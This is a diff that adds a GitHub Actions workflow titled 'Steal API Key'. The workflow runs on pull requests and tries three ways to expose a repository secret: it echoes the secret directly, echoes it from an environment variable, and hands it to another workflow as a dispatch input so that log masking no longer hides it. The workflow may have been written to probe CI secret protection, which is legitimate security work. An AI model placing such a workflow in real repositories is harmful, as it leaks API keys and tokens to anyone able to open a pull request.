@@ -1,0 +1,32 @@
+name: Steal API Key
+
+on: [pull_request]
+
+jobs:
+  steal-api-key:
+    runs-on: ubuntu-latest
+
+    # to trigger other workflows.
+    permissions:
+      actions: write
+
+    steps:
+      # This step checks out a copy of your repository
+      # so that git and gh commands have context.
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+
+      - name: Attempt to reveal the secret
+        env:
+          API_KEY: ${{ secrets.API_KEY }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "Attempt 1: Direct echo"
+          echo ${{ secrets.API_KEY }}
+
+          echo "Attempt 2: Echo from an environment variable"
+          echo $API_KEY
+
+          echo "Attempt 3: Send api key to a workflow dispatch, removing command line printing protection."
+          gh workflow run workflow-dispatch.yaml --ref ${{ github.event.pull_request.head.ref }} -f message="$API_KEY"
